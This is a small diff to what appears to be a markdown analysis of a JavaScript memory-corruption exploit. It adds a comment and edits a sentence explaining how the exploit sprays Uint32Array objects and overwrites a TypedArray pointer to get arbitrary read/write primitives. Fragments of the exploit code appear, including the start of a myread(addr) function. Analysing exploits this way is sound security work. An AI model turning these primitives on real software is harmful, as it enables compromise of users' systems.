@@ -297,6 +297,8 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
             for(var i2 = 0x10; i2 < 0x10000; i2++)
                 arr[i2] = new Uint32Array(1);
             for(var i2 = 1; i2 < 0x10; i2++){
+
+                // this is the TypedArray that used for the full read/write primitive
                 arr[i2] = new Uint32Array(sprayarr[i1 + i2]);
 
                 // set the index into the first element of the TypedArray
@@ -327,7 +329,7 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
                     myarraybase = mydv.getUint32(mypos, true);
 ```
 
-<p class="cn" markdown="1">For the full read and write primitives, they overwrite the TypedArray pointer stored in the first element of the `arr` Array using `mypos` with the address they want to read/write from, do the read/write and then set the pointer to the TypedArray back to the base address (`myarraybase`).</p>
+<p class="cn" markdown="1">For the full read and write primitives, they overwrite the TypedArray pointer stored in the first element of the `arr` Array using `mypos` with the address they want to read/write from, do the read/write and then set the pointer to the TypedArray back to the base address `myarraybase`.</p>
 
 ```
 function myread(addr){
